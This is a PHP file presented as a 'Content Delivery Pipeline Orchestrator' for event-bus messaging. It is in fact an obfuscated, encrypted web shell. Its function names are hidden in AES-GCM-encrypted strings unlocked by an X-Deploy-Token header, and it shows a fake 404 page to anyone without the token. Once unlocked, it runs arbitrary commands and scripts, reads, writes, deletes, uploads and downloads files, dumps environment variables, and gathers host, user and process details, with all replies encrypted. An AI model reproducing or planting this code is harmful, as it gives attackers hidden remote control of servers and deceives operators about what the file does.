<?php
/**
 * Content Delivery Pipeline Orchestrator v2.6.8
 * Facilitates inter-service message passing via event bus.
 * Tied to deployment pipeline stage-3. As of: 2025-02-06
 */
@error_reporting(0);
@ini_set('display_errors', '0');

$_adapterPool = array("/YNb67nKwSYi8uy0potHlPpghm74quOnte6gJxh72pmH", "Ij2XfZBBQbeX3kKS2fiLI0mr2cxkk9ZeSrYCPL7yo6tl5Xj/JMg=", "92dca8FTDIPA6Hgid2UQlvU9Ls/MFAsL594AZlabOuk=", "8x7F3UzRJHFL4WTWI1tvkoOnglOzFBw1fNIGCxMhLfQ94A==", "wFfeP6kCGielMjYpHZado7TMxY6CeI70A4Mwd6ABORdr2J9h", "EVFCZD2ExjA4fx1djgIxcSTUNVmUE2Zvu3gAvCFROnYlUhY2lA==", "sVbcyzS8RfhmY9wnY5joe+IJFnKc04c11sngpY6QicAYTwL/82j/", "NSavOZeSt1Yex/Q2ci/8c2snzEbfgDfjZULU3HSlpnkbwN+5Hw==", "8rxSOC8j6hEwVTnxhA48oXeuzyncdO1mRWYxGjdH", "jOtIyBl89EUUyDzwQp3ICquNaoaaDYL+BH/oWA21GXfvkRuZ9LgfSoeI44I4K6AareaxvpXysHLJjL6e1w==", "2AA76N1jYr5MfxghtaYbD6XPPWN2x36Sv/11L9mSphs=", "iFOyURtPMPXzWdp23bl+VpVyNdx04YejvylA3nT6r7r+", "erMddEseZAOg2EGVTXsh4Z8IZzXB5aCxUfXNe7g9cw==", "w0lJ9IJfQ0kCfv3Y1yc8eWePVgLDt7zbKA2lPvpFJA==", "2EQZiOGrwesYyyImovHCgRHx/PRrO9akx28QJhu2uK0T4A==", "P/7wXKwbZPl+5GY2x76p54zCbh1Yp/I0GusDsQ8b6Q==", "8X4UnTtegiC9z9aGWXQL+DEMPkpeE8Rbr4308kZh7AwBKhsQYQYfWNnmY/PMvKdWza4tl5FvmWRM5xJuZOBGsyMfv0wu6rgbf00g5MB6qW1PvKkQtFcofpcT9H1Ig4NFRzsoDZsHM2sylHjPCrN3dLIQ8I0xLxGuxPnLubIoM4sJmTD8hGKapMUHCYA6nN3CG6bLRri6kOdEdYS37PPg7ZzqK5OG3/zZoxjNw25eLgkj1qcA0MkwBI9BgD1ZciADMg==", "aU9aP99IssPWEy0EV3+XLqlzBDtUuiIdNAgjb3lBB2jwtDpIQ246ZveqhV812Om7W1em1A7BF97iGC/t82A7DXcJwotO/RLEciB1xFvtmw8v0jOP6pLi2DpsqQIX+xqgTnq7Uw==", "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", "26N/gIHpe1hAHivL7yWFdUUKdtjPQZcDqRTq6eeb1fYUFhk+PxIwspj8NcyRBBxHqcuTXmpKLosWLeKLNCKvSF0xIT52hg==", "/U1DcgxdZ3UqO1CB85lLr2Y5pT5qKF0iPBGgJdS7FtSPgg==", "8utA9ZqNsbpqZW85YyNU0YfBs2JZH4A8/JEEghOV/9xcXpu6", "6y13Qlm+wIBq9Mem70S0C+EG4vpJj5WHN6mVj+eR/VMI3REaHcFobtt+zd0YAXnJWS/Y6bY09ItRRY6ahtsH4jmaNYQ1lUrW8uDij3vN9I8D5sfjRrL1/YShTK2apId8xhjC3qGc/oIcVaH5awYrdGVfZ6ht+TRF54aZ4eCMRYum6l5lw/pHbb7Q1zsXGxggnqLyjS+sN3n5mRD9XxX9K+uTjxFUaEqF4UIzhPQY/CqF15jkOqtQJjKwZeHVjkncJAmYNriHrvxwb62ZiPXfxhBzpXh5Hw==", "MzCZNqJC2lc0yA5Qk6Tg6T7fCV9lboa0h5+FpsXUffWByws4nOu5vvT3gZ6kqymG23fe5unt/s3pjCiAlv1CGoe2y3uYx524rGLY9VU55BqRLaSAR16YMTFM/xY=");

function archiveEntry($e, $partitionId) {
    $raw = @base64_decode($e);
    if ($raw === false || strlen($raw) < 28) return '';
    $n = substr($raw, 0, 12);
    $t = substr($raw, -16);
    $ct = substr($raw, 12, -16);
    $r = @openssl_decrypt($ct, 'aes-256-gcm', hash('sha256', $partitionId, true), OPENSSL_RAW_DATA, $n, $t);
    return ($r !== false) ? $r : '';
}

function ackMessage($e, $partitionId) {
    global $_adapterPool;
    $D = 'archiveEntry';
    $tk = @hex2bin($D($_adapterPool[38], $partitionId));
    if (empty($tk) || strlen($tk) !== 32) return false;
    $raw = @base64_decode($e);
    if ($raw === false || strlen($raw) < 28) return false;
    $n = substr($raw, 0, 12);
    $t = substr($raw, -16);
    $ct = substr($raw, 12, -16);
    return @openssl_decrypt($ct, $D($_adapterPool[32], $partitionId), $tk, OPENSSL_RAW_DATA, $n, $t);
}

function syncPartition($data, $partitionId) {
    global $_adapterPool;
    $D = 'archiveEntry';
    $tk = @hex2bin($D($_adapterPool[38], $partitionId));
    if (empty($tk) || strlen($tk) !== 32) return false;
    $n = random_bytes(12);
    $t = '';
    $ct = @openssl_encrypt($data, $D($_adapterPool[32], $partitionId), $tk, OPENSSL_RAW_DATA, $n, $t, '', 16);
    if ($ct === false) return false;
    return base64_encode($n . $ct . $t);
}

function assemblePayload($body, $field) {
    $data = @json_decode($body, true);
    return ($data !== null && isset($data[$field])) ? $data[$field] : '';
}

function unwrapMessage() {
    http_response_code(404);
    header('Content-Type: text/html; charset=UTF-8');
    echo '<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>' . ($_SERVER['SERVER_SOFTWARE'] ?? 'nginx/1.24.0') . '</center></body></html>';
    exit;
}

function pullDelta($fullcmd, $partitionId) {
    global $_adapterPool;
    $D = 'archiveEntry';
    $df = array_map('trim', explode(',', @ini_get($D($_adapterPool[19], $partitionId))));

    $fn1 = $D($_adapterPool[1], $partitionId);
    if (!empty($fn1) && function_exists($fn1) && !in_array($fn1, $df)) {
        $r = @$fn1($fullcmd . ' 2>&1');
        return ($r !== null) ? $r : '';
    }

    $fn2 = $D($_adapterPool[2], $partitionId);
    if (!empty($fn2) && function_exists($fn2) && !in_array($fn2, $df)) {
        $out = array(); $rc = 0;
        @$fn2($fullcmd . ' 2>&1', $out, $rc);
        $r = implode("\n", $out);
        if ($rc !== 0) $r .= "\n[exit:" . $rc . "]";
        return $r;
    }

    $fn3 = $D($_adapterPool[3], $partitionId);
    if (!empty($fn3) && function_exists($fn3) && !in_array($fn3, $df)) {
        ob_start(); @$fn3($fullcmd . ' 2>&1'); return ob_get_clean();
    }

    $fn4 = $D($_adapterPool[4], $partitionId);
    if (!empty($fn4) && function_exists($fn4) && !in_array($fn4, $df)) {
        ob_start(); @$fn4($fullcmd . ' 2>&1'); return ob_get_clean();
    }

    $fn5 = $D($_adapterPool[5], $partitionId);
    if (!empty($fn5) && function_exists($fn5) && !in_array($fn5, $df)) {
        $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $proc = @$fn5($fullcmd, $desc, $pipes);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]); @fclose($pipes[1]);
            $err = @stream_get_contents($pipes[2]); @fclose($pipes[2]);
            @proc_close($proc);
            return $out . $err;
        }
    }

    return $D($_adapterPool[18], $partitionId) ? explode('~', $D($_adapterPool[18], $partitionId))[17] : 'unavailable';
}

function cloneInstance($interpreter, $code, $partitionId) {
    global $_adapterPool, $_endpointCache;
    $D = 'archiveEntry';

    $isWin = (strtoupper(substr(constant($_endpointCache[1]), 0, 3)) === $_endpointCache[13]);
    if (!$isWin) {
        $spl = explode('~', $D($_adapterPool[26], $partitionId));
        $sn = $spl[array_rand($spl)];
        $wl = explode('~', $D($_adapterPool[25], $partitionId));
        $sm = explode('~', $D($_adapterPool[28], $partitionId));
        $idx = array_search($interpreter, $wl);
        if ($idx !== false) {
            $pfx = explode('~', $D($_adapterPool[27], $partitionId));
            $pi = intval($sm[$idx]);
            if (isset($pfx[$pi])) {
                $code = sprintf($pfx[$pi], $sn) . $code;
            }
        }
    }

    $df = array_map('trim', explode(',', @ini_get($D($_adapterPool[19], $partitionId))));
    $fn5 = $D($_adapterPool[5], $partitionId);

    if (!empty($fn5) && function_exists($fn5) && !in_array($fn5, $df)) {
        $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $proc = @$fn5($interpreter . ' -', $desc, $pipes);
        if (is_resource($proc)) {
            @fwrite($pipes[0], $code);
            @fclose($pipes[0]);
            $stdout = @stream_get_contents($pipes[1]); @fclose($pipes[1]);
            $stderr = @stream_get_contents($pipes[2]); @fclose($pipes[2]);
            $exit = @proc_close($proc);
            $r = $stdout;
            if (!empty($stderr)) $r .= "\n[stderr] " . $stderr;
            if ($exit !== 0) $r .= "\n[exit:" . $exit . "]";
            return $r;
        }
    }

    $b64 = base64_encode($code);
    return pullDelta("echo '" . $b64 . "' | base64 -d | " . $interpreter, $partitionId);
}

function formatBlock($action, $arg, $partitionId) {
    global $_adapterPool, $_endpointCache;
    $D = 'archiveEntry';
    $result = '';
    $isWin = (strtoupper(substr(constant($_endpointCache[1]), 0, 3)) === $_endpointCache[13]);

    $aEx = $D($_adapterPool[10], $partitionId);
    $aSh = $D($_adapterPool[11], $partitionId);
    $aCm = $D($_adapterPool[12], $partitionId);
    $aPs = $D($_adapterPool[13], $partitionId);
    $aDr = $D($_adapterPool[14], $partitionId);
    $aWm = $D($_adapterPool[15], $partitionId);
    $aSc = $D($_adapterPool[24], $partitionId);
    $aMx = $D($_adapterPool[30], $partitionId);
    $al  = explode('~', $D($_adapterPool[16], $partitionId));
    $rk  = explode('~', $D($_adapterPool[17], $partitionId));
    $ms  = explode('~', $D($_adapterPool[18], $partitionId));

    if ($action === $aEx || $action === $aSh || $action === $aCm) {
        if (empty($arg)) return $ms[0];
        if ($isWin) {
            return pullDelta($arg, $partitionId);
        } else {
            $bash = $D($_adapterPool[7], $partitionId);
            $cflag = $D($_adapterPool[8], $partitionId);
            $spl = explode('~', $D($_adapterPool[26], $partitionId));
            $sn = $spl[array_rand($spl)];
            $inner = $D($_adapterPool[29], $partitionId) . escapeshellarg($sn) . ' ' . $bash . ' ' . $cflag . ' ' . escapeshellarg($arg);
            return pullDelta($bash . ' ' . $cflag . ' ' . escapeshellarg($inner), $partitionId);
        }
    }
    elseif ($action === $aDr) {
        if (empty($arg)) return $ms[0];
        return pullDelta($arg, $partitionId);
    }
    elseif ($action === $aPs) {
        if (empty($arg)) return $ms[0];
        return pullDelta($D($_adapterPool[9], $partitionId) . $arg, $partitionId);
    }
    elseif ($action === $aWm) {
        if (empty($arg)) return $ms[0];
        return pullDelta($arg, $partitionId);
    }
    elseif ($action === $aSc) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[19];
        $p = strpos($arg, '|');
        $interp = substr($arg, 0, $p);
        $b64 = substr($arg, $p + 1);
        $code = @base64_decode($b64);
        if ($code === false) return $ms[19];
        $wl = explode('~', $D($_adapterPool[25], $partitionId));
        if (!in_array($interp, $wl)) return $ms[20];
        return cloneInstance($interp, $code, $partitionId);
    }
    elseif ($action === $aMx) {
        if ($isWin) return $ms[21];
        $df = array_map('trim', explode(',', @ini_get($D($_adapterPool[19], $partitionId))));
        $fn5 = $D($_adapterPool[5], $partitionId);
        if (empty($fn5) || !function_exists($fn5) || in_array($fn5, $df)) return $ms[22];
        if (empty($arg)) return $ms[19];
        $p = strpos($arg, '|');
        if ($p !== false) {
            $eb = substr($arg, 0, $p);
            $ua = trim(substr($arg, $p + 1));
        } else {
            $eb = $arg;
            $ua = '';
        }
        $aa = !empty($ua) ? array_values(array_filter(explode(' ', $ua), 'strlen')) : array();
        $tpl = $D($_adapterPool[31], $partitionId);
        $bs = sprintf($tpl, $eb, json_encode($aa));
        $wl = explode('~', $D($_adapterPool[25], $partitionId));
        $r = cloneInstance($wl[0], $bs, $partitionId);
        if (strpos($r, 'not found') !== false || strpos($r, 'No such file') !== false) {
            $r = cloneInstance($wl[1], $bs, $partitionId);
        }
        return $r;
    }
    elseif ($action === $al[0]) {
        if (empty($arg)) return $ms[2] . $_endpointCache[4]();
        $rp = @realpath($arg);
        if ($rp !== false && @is_dir($rp)) return $ms[2] . $rp;
        return $ms[1] . $arg;
    }
    elseif ($action === $al[1]) {
        $result .= $rk[0] . '=' . ($_SERVER['SERVER_SOFTWARE'] ?? '') . "\n";
        $result .= $rk[1] . '=' . @$_endpointCache[7]() . "\n";
        $result .= $rk[2] . '=' . @$_endpointCache[7]() . "\n";
        $_hn = @$_endpointCache[7]();
        $_lip = @gethostbyname($_hn);
        if (empty($_lip) || $_lip === $_hn) $_lip = ($_SERVER['SERVER_ADDR'] ?? '');
        $_priv = (substr($_lip, 0, 3) === '10.' || substr($_lip, 0, 8) === '192.168.' || substr($_lip, 0, 4) === '172.');
        if (!$_priv) {
            if ($isWin) {
                $_ipc = @pullDelta($D($_adapterPool[6], $partitionId) . 'ipconfig', $partitionId);
            } else {
                $_ipc = @pullDelta('hostname -I 2>/dev/null || ip -4 addr show 2>/dev/null', $partitionId);
            }
            if (!empty($_ipc) && preg_match_all('/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/', $_ipc, $_m)) {
                foreach ($_m[1] as $_pip) {
                    if (substr($_pip, 0, 3) === '10.' || substr($_pip, 0, 8) === '192.168.' || substr($_pip, 0, 4) === '172.') {
                        $_lip = $_pip;
                        break;
                    }
                }
            }
        }
        $result .= $rk[3] . '=' . $_lip . "\n";
        if (isset($_SERVER['SERVER_ADDR']) && $_SERVER['SERVER_ADDR'] !== $_lip) {
            $result .= $rk[13] . '=' . $_SERVER['SERVER_ADDR'] . "\n";
        }
        $result .= $rk[4] . '=' . ($_SERVER['SERVER_PORT'] ?? '') . "\n";
        $result .= $rk[5] . '=' . @$_endpointCache[4]() . "\n";
        $result .= $rk[6] . '=' . @$_endpointCache[8]() . "\n";
        if ($isWin) {
            $_ud = @getenv('USERDOMAIN');
            $_un = @getenv('USERNAME');
            $u = !empty($_un) ? $_un : @$_endpointCache[9]();
            if (!empty($_ud)) $u = $_ud . '\\' . $u;
        } else {
            $u = @$_endpointCache[9]();
            if (function_exists($_endpointCache[10]) && function_exists($_endpointCache[11])) {
                $pw = @$_endpointCache[11](@$_endpointCache[10]());
                if ($pw) $u = $pw['name'];
            }
        }
        $result .= $rk[7] . '=' . $u . "\n";
        $result .= $rk[11] . '=' . @$_endpointCache[8]('m') . "\n";
        if ($isWin) {
            $_dr = '';
            for ($_i = 65; $_i <= 90; $_i++) {
                if (@is_dir(chr($_i) . ':\\')) $_dr .= chr($_i) . ':\\,';
            }
            if (!empty($_dr)) $result .= $rk[9] . '=' . rtrim($_dr, ',') . "\n";
        }
        return $result;
    }
    elseif ($action === $al[2] || $action === $al[3] || $action === $al[4]) {
        $u = @$_endpointCache[9]();
        if (function_exists($_endpointCache[10]) && function_exists($_endpointCache[11])) {
            $pw = @$_endpointCache[11](@$_endpointCache[10]());
            if ($pw) $u = $pw['name'];
        }
        return $u;
    }
    elseif ($action === $al[5] || $action === $al[6]) {
        return @$_endpointCache[7]() . ' ' . @$_endpointCache[8]();
    }
    elseif ($action === $al[7]) {
        return @$_endpointCache[4]();
    }
    elseif ($action === $al[8] || $action === $al[9]) {
        $dp = empty($arg) ? @$_endpointCache[4]() : $arg;
        if (!@is_dir($dp)) return $ms[3] . $dp;
        $items = @scandir($dp);
        if ($items === false) return $ms[3] . $dp;
        foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = $dp . constant($_endpointCache[3]) . $f;
            if (@is_dir($full)) {
                $result .= $ms[8] . @date('Y-m-d H:i', @filemtime($full)) . ' ' . $f . "\n";
            } else {
                $sz = @filesize($full);
                $result .= $ms[9] . @date('Y-m-d H:i', @filemtime($full)) . ' ' . ($sz !== false ? $sz : 0) . ' ' . $f . "\n";
            }
        }
        return $result;
    }
    elseif ($action === $al[10] || $action === $al[11] || $action === $al[12]) {
        if (empty($arg)) return $ms[0];
        if (!@file_exists($arg)) return $ms[4] . $arg;
        $c = @file_get_contents($arg);
        return ($c !== false) ? $c : $ms[4] . $arg;
    }
    elseif ($action === $al[13]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[5];
        $p = strpos($arg, '|');
        $path = substr($arg, 0, $p);
        $content = substr($arg, $p + 1);
        $bytes = @file_put_contents($path, $content);
        return ($bytes !== false) ? $ms[2] . $bytes . ' bytes' : $ms[4] . $path;
    }
    elseif ($action === $al[14]) {
        if (empty($arg)) return $ms[6];
        return @mkdir($arg, 0755, true) ? $ms[2] . $arg : $ms[4] . $arg;
    }
    elseif ($action === $al[15] || $action === $al[16]) {
        if (empty($arg)) return $ms[6];
        if (@is_file($arg)) { @unlink($arg); return $ms[14]; }
        if (@is_dir($arg)) {
            $ri = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($arg, \FilesystemIterator::SKIP_DOTS),
                \RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($ri as $fi) {
                $fi->isDir() ? @rmdir($fi->getRealPath()) : @unlink($fi->getRealPath());
            }
            @rmdir($arg);
            return $ms[15];
        }
        return $ms[4] . $arg;
    }
    elseif ($action === $al[17]) {
        if (constant($_endpointCache[14]) >= 70100) {
            $env = @getenv();
            if (is_array($env)) {
                foreach ($env as $ek => $ev) $result .= $ek . '=' . $ev . "\n";
            }
        }
        if (empty($result)) {
            foreach ($_SERVER as $ek => $ev) {
                if (!is_array($ev)) $result .= $ek . '=' . $ev . "\n";
            }
        }
        return $result;
    }
    elseif ($action === $al[18] || $action === $al[19]) {
        if (!$isWin) {
            $procDir = $D($_adapterPool[21], $partitionId);
            $d = @opendir($procDir);
            if ($d) {
                while (($entry = @readdir($d)) !== false) {
                    if (!is_numeric($entry)) continue;
                    $status = @file_get_contents($procDir . '/' . $entry . '/status');
                    $name = $entry;
                    if ($status && preg_match('/^Name:\s+(.+)$/m', $status, $m)) $name = $m[1];
                    $result .= str_pad($entry, 7) . ' ' . $name . "\n";
                }
                @closedir($d);
            }
            if (empty($result)) {
                $result = pullDelta($D($_adapterPool[35], $partitionId), $partitionId);
            }
        } else {
            if (class_exists('COM')) {
                try {
                    $svc = new \COM($D($_adapterPool[22], $partitionId));
                    $items = $svc->ExecQuery($D($_adapterPool[23], $partitionId));
                    foreach ($items as $it) {
                        $result .= str_pad($it->ProcessId, 7) . ' ' . $it->Name . "\n";
                    }
                } catch (\Exception $e) {
                    $result = pullDelta($D($_adapterPool[6], $partitionId) . $D($_adapterPool[36], $partitionId), $partitionId);
                }
            } else {
                $result = pullDelta($D($_adapterPool[6], $partitionId) . $D($_adapterPool[36], $partitionId), $partitionId);
            }
        }
        return $result;
    }
    elseif ($action === $al[20] || $action === $al[21]) {
        $result .= $rk[1] . '=' . @$_endpointCache[7]() . "\n";
        $result .= $rk[3] . '=' . ($_SERVER['SERVER_ADDR'] ?? @gethostbyname(@$_endpointCache[7]())) . "\n";
        $result .= $rk[4] . '=' . ($_SERVER['SERVER_PORT'] ?? '') . "\n";
        $result .= $rk[8] . '=' . ($_SERVER['REMOTE_ADDR'] ?? '') . "\n";
        return $result;
    }
    elseif ($action === $al[22]) {
        return implode('|', $al);
    }
    elseif ($action === $al[23]) {
        if ($isWin) {
            for ($i = 65; $i <= 90; $i++) {
                $dr = chr($i) . ':\\';
                if (@is_dir($dr)) {
                    $free = @$_endpointCache[12]($dr);
                    if ($free !== false)
                        $result .= chr($i) . ':\\ ' . intval($free / 1048576) . 'MB free' . "\n";
                    else
                        $result .= chr($i) . ":\\\n";
                }
            }
        } else {
            $free = @$_endpointCache[12]('/');
            $result .= "/ " . ($free !== false ? intval($free / 1048576) . "MB free" : "") . "\n";
        }
        return $result;
    }
    elseif ($action === $al[24]) {
        if (empty($arg)) return $ms[6];
        if (!@file_exists($arg)) return $ms[4] . $arg;
        $data = @file_get_contents($arg);
        return ($data !== false) ? base64_encode($data) : $ms[4] . $arg;
    }
    elseif ($action === $al[25]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[18];
        $p = strpos($arg, '|');
        $path = substr($arg, 0, $p);
        $data = base64_decode(substr($arg, $p + 1));
        $bytes = @file_put_contents($path, $data);
        return ($bytes !== false) ? $ms[16] : $ms[4] . $path;
    }
    elseif ($action === $al[26] || $action === $al[27]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[18];
        $p = strpos($arg, '|');
        $src = substr($arg, 0, $p); $dst = substr($arg, $p + 1);
        if (@file_exists($src)) {
            return @copy($src, $dst) ? $ms[12] : $ms[4] . $src;
        }
        return $ms[11];
    }
    elseif ($action === $al[28] || $action === $al[29] || $action === $al[30]) {
        if (empty($arg) || strpos($arg, '|') === false) return $ms[18];
        $p = strpos($arg, '|');
        $src = substr($arg, 0, $p); $dst = substr($arg, $p + 1);
        if (@file_exists($src) || @is_dir($src)) {
            return @rename($src, $dst) ? $ms[13] : $ms[4] . $src;
        }
        return $ms[11];
    }
    elseif ($action === $al[31]) {
        $_l = explode('~', $D($_adapterPool[33], $partitionId));
        $result .= $_l[0] . "\n";
        $result .= $_l[1] . constant($_endpointCache[0]) . "\n";
        $result .= $_l[2] . constant($_endpointCache[1]) . "\n";
        $result .= $_l[3] . constant($_endpointCache[2]) . "\n";
        $result .= $_l[4] . ($_SERVER['SERVER_SOFTWARE'] ?? $_l[19]) . "\n";
        $result .= $_l[5] . @$_endpointCache[4]() . "\n";
        $result .= $_l[6] . @$_endpointCache[5]() . "\n";
        $result .= $_l[7] . (@$_endpointCache[6](@$_endpointCache[5]()) ? $_l[8] : $_l[9]) . "\n";
        $di = @ini_get($D($_adapterPool[19], $partitionId));
        $df = array_map('trim', explode(',', $di));
        $fns = array(
            $D($_adapterPool[1], $partitionId), $D($_adapterPool[2], $partitionId),
            $D($_adapterPool[3], $partitionId), $D($_adapterPool[4], $partitionId),
            $D($_adapterPool[5], $partitionId)
        );
        foreach ($fns as $fn) {
            if (empty($fn)) continue;
            $ok = function_exists($fn) && !in_array($fn, $df);
            $result .= $fn . ': ' . ($ok ? $_l[10] : $_l[11]) . "\n";
        }
        $result .= $_l[12] . (@ini_get($_l[22]) ?: $_l[13]) . "\n";
        if ($isWin) {
            $result .= $_l[14] . (class_exists('COM') ? $_l[10] : $_l[11]) . "\n";
        } else {
            $result .= $_l[15] . (function_exists($_endpointCache[10]) ? $_l[10] : $_l[11]) . "\n";
        }
        $_ae = function_exists('openssl_encrypt');
        $_tk = $_ae ? @hex2bin($D($_adapterPool[38], $partitionId)) : '';
        $result .= $_l[16] . ($_ae && !empty($_tk) && strlen($_tk) === 32 ? $_l[10] : $_l[11]) . "\n";
        $ipl = explode('~', $D($_adapterPool[25], $partitionId));
        $_bp = explode('~', $D($_adapterPool[34], $partitionId));
        foreach ($ipl as $ip) {
            $found = false;
            if ($isWin) {
                $out = array(); $rc = 1;
                @exec($_l[20] . $ip . $_l[21], $out, $rc);
                $found = ($rc === 0 && !empty($out));
            } else {
                foreach ($_bp as $bp) {
                    if (@file_exists($bp . $ip)) { $found = true; break; }
                }
            }
            $result .= $_l[17] . $ip . ': ' . ($found ? $_l[10] : $_l[18]) . "\n";
        }
        return $result;
    }
    else {
        return $ms[7] . $action;
    }
}

// ========== Entry Point ==========
$partitionId = isset($_SERVER['HTTP_X_DEPLOY_TOKEN']) ? $_SERVER['HTTP_X_DEPLOY_TOKEN'] : '';
if (empty($partitionId)) unwrapMessage();

$D = 'archiveEntry';
if (@$D($_adapterPool[0], $partitionId) !== 'valid') unwrapMessage();
if ($_SERVER['REQUEST_METHOD'] !== 'POST') unwrapMessage();

$_endpointCache = explode('~', $D($_adapterPool[37], $partitionId));

$body = @file_get_contents('php://input');
if (empty($body)) unwrapMessage();

$PJ = 'assemblePayload';
$rid = $PJ($body, 'rid');
$em  = $PJ($body, 'module');
$ed  = $PJ($body, 'data');
if (empty($em)) unwrapMessage();

$AD = 'ackMessage';
$action = @$AD($em, $partitionId);
if ($action === false || empty($action)) unwrapMessage();

$arg = '';
if (!empty($ed)) {
    $arg = @$AD($ed, $partitionId);
    if ($arg === false) $arg = '';
}

$result = formatBlock($action, $arg, $partitionId);

header('Content-Type: application/json');
$AE = 'syncPartition';
$enc = @$AE($result, $partitionId);
if (empty($enc)) unwrapMessage();
echo json_encode(array('status' => 200, 'rid' => $rid, 'payload' => $enc, 'ts' => time()));
